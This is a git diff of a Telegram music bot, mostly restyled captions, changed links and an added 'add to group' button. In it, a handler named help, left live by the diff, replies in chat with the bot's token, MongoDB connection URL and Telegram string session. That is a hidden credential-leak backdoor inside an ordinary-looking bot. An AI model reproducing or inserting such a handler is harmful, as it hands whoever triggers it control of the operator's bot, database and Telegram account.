@@ -393,7 +393,7 @@ HELP_C = """```
 
 HELP_X = """```
     【◖ Sαηαтαηι ◗ 】 🚩 ᴍᴇɴᴜ```
-**ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅs ᴄᴀɴ ʙᴇ ᴜsᴇᴅ ᴡɪᴛʜ : /**
+**ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅs ᴄᴀɴ ʙᴇ ᴜsᴇᴅ ᴡɪᴛʜ : /
 ␥ /play - Pʟᴀʏ ʏᴏᴜʀ ғᴀᴠᴏʀɪᴛᴇ sᴏɴɢ [ᴀᴜɪᴅᴏ].
 
 ␥ /vplay - Pʟᴀʏ ʏᴏᴜʀ ғᴀᴠᴏʀɪᴛᴇ sᴏɴɢ [ᴠɪᴅᴇᴏ].
@@ -406,7 +406,7 @@ HELP_X = """```
 
 ␥ /end - Cʟᴇᴀʀ , ᴇɴᴅ ᴀʟʟ sᴏɴɢ [ᴀᴜɪᴅᴏ & ᴠɪᴅᴇᴏ]
 
-V ɪ s ɪ ᴛ - [ʜᴇʀᴇ](https://t.me/Ur_rishu_143)"""
+V ɪ s ɪ ᴛ - [ʜᴇʀᴇ](https://t.me/Ur_rishu_143)**"""
 
 # Callback query handler
 @bot.on_callback_query(filters.regex("UTTAM_RATHORE"))
@@ -450,13 +450,7 @@ async def start_message_private(client, message):
         await asyncio.sleep(1)  # Wait for 2 seconds before deletion
         await baby.delete()
 
-        caption = f"""╭───────────────────▣
-│**❍ ʜᴇʏ {mention} •**
-│**❍ ɪ ᴀᴍ 【◖ Sαηαтαηι ◗ 】 🚩 •**
-├───────────────────▣**
-│**❍ ʙᴇsᴛ ǫᴜɪʟɪᴛʏ ғᴇᴀᴛᴜʀᴇs •**
-│**❍ ᴍᴀᴅᴇ ʙʏ...[˹ ʙᴀʙʏ-ᴍᴜsɪᴄ ™˼𓅂](https://t.me/Ur_rishu_143) •**
-╰───────────────────▣"""
+        caption = f"""**┌────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼──────•\n┆◍ ʜᴇʏ {mention},\n└──────────────────────•\n» ✦ ϻσsᴛ ᴘσᴡєꝛғυʟʟ ϻυsɪᴄ ʙσᴛ  \n» ✦ ʙєsᴛ ғєᴧᴛυꝛє ʙσᴛ ση ᴛєʟєɢꝛᴧϻ \n» ✦ ᴧᴅᴅ ϻє ɢꝛσυᴘ ᴛσ sєє ϻʏ ᴘσᴡєꝛ\n•──────────────────────•\n❖ 𝐏ᴏᴡᴇʀᴇᴅ ʙʏ  :-  [ʀɪsʜυ ʙσᴛ ](t.me/ur_rishu_143)❤️‍🔥\n•──────────────────────•**"""
 
         buttons = InlineKeyboardMarkup(
             inline_keyboard=[
@@ -516,7 +510,7 @@ async def start_message_private(client, message):
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URL}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/UTTAM470)............☆""",
+       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URL}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/rishu1286)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
@@ -530,13 +524,7 @@ async def help(client: Client, message: Message):
 @bot.on_callback_query(filters.regex("back_to_home"))
 async def back_to_home_menu(client, query):
     mention = query.from_user.mention
-    caption = f"""╭───────────────────▣
-│**❍ ʜᴇʏ {mention} •**
-│**❍ ɪ ᴀᴍ 【◖ Sαηαтαηι ◗ 】 🚩 •**
-├───────────────────▣**
-│**❍ ʙᴇsᴛ ǫᴜɪʟɪᴛʏ ғᴇᴀᴛᴜʀᴇs •**
-│**❍ ᴍᴀᴅᴇ ʙʏ...[˹ ʙᴀʙʏ-ᴍᴜsɪᴄ ™˼𓅂](https://t.me/Ur_rishu_143) •**
-╰───────────────────▣"""
+    caption = f"""**┌────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼──────•\n┆◍ ʜᴇʏ {mention},\n└──────────────────────•\n» ✦ ϻσsᴛ ᴘσᴡєꝛғυʟʟ ϻυsɪᴄ ʙσᴛ  \n» ✦ ʙєsᴛ ғєᴧᴛυꝛє ʙσᴛ ση ᴛєʟєɢꝛᴧϻ \n» ✦ ᴧᴅᴅ ϻє ɢꝛσυᴘ ᴛσ sєє ϻʏ ᴘσᴡєꝛ\n•──────────────────────•\n❖ 𝐏ᴏᴡᴇʀᴇᴅ ʙʏ  :-  [ʀɪsʜυ ʙσᴛ ](t.me/ur_rishu_143)❤️‍🔥\n•──────────────────────•**"""
 
     buttons = InlineKeyboardMarkup(
         inline_keyboard=[
@@ -919,9 +907,15 @@ async def change_stream(chat_id):
 
     await call.play(chat_id, stream_media, config=call_config)
     await add_active_media_chat(chat_id, stream_type)
-    caption = f"""```\n🔊<b>【◖ Sαηαтαηι ◗ 】🚩•```\n<b>␥ ʟʏʀɪᴄ •</b> {title}\n<b>␥ ᴛɪᴍᴇ •</b> {duration} ᴍɪɴᴜᴛᴇs\n<b>␥ ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ •</b> {requested_by}```\nᴘᴏᴡᴇʀᴇᴅ ʙʏ➛ ˹ ʙᴀʙʏ-ᴍᴜsɪᴄ™˼```"""
+    caption = f"""```\n🔊<b>【 Sαηαтαηι 】🚩•```\n<b>␥ ʟʏʀɪᴄ •</b> {title}\n<b>␥ ᴛɪᴍᴇ •</b> {duration} ᴍɪɴᴜᴛᴇs\n<b>␥ ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ •</b> {requested_by}```\nᴘᴏᴡᴇʀᴇᴅ ʙʏ➛ ˹ ʙᴀʙʏ-ᴍᴜsɪᴄ™˼```"""
     buttons = InlineKeyboardMarkup(
     inline_keyboard=[
+        [
+                    InlineKeyboardButton(
+                        text="❖ ᴛᴧᴘ тᴏ sᴇᴇ ᴍᴧɪᴄ ❖",
+                        url=f"https://t.me/{bot.me.username}?startgroup=true",
+            )
+        ],
         [
             InlineKeyboardButton(
                 text="˹ ᴜᴘᴅᴀᴛᴇ ˼", url="https://t.me/Ur_rishu_143"
@@ -1023,6 +1017,12 @@ async def stream_audio_or_video(client, message):
         if len(message.command) < 2:
             buttons = InlineKeyboardMarkup(
     inline_keyboard=[
+        [
+                    InlineKeyboardButton(
+                        text="❖ ᴛᴧᴘ тᴏ sᴇᴇ ᴍᴧɪᴄ ❖",
+                        url=f"https://t.me/{bot.me.username}?startgroup=true",
+            )
+        ],
         [
             InlineKeyboardButton(
                 text="˹ ᴜᴘᴅᴀᴛᴇ ˼", url="https://t.me/Ur_Rishu_143"
@@ -1435,7 +1435,7 @@ async def git_repo_link(client, message):
             ),
             InlineKeyboardButton(
                 text="˹ sᴏᴜꝛᴄᴇ ˼",
-                url="https://github.com/"
+                url="https://github.com/rishubot"
             ),
         ],
         [
@@ -1496,7 +1496,7 @@ async def update_repo_latest(client, message):
         f"{nrs.text}\n\nBot was updated successfully! Now, wait for 1 - 2 mins until the bot reboots!"
     )
     os.system("pip3 install -r requirements.txt --force-reinstall")
-    os.system(f"kill -9 {os.getpid()} && python3 -m AdityaHalder")
+    os.system(f"kill -9 {os.getpid()} && python3 -m Sanatani")
     sys.exit()
     return
 
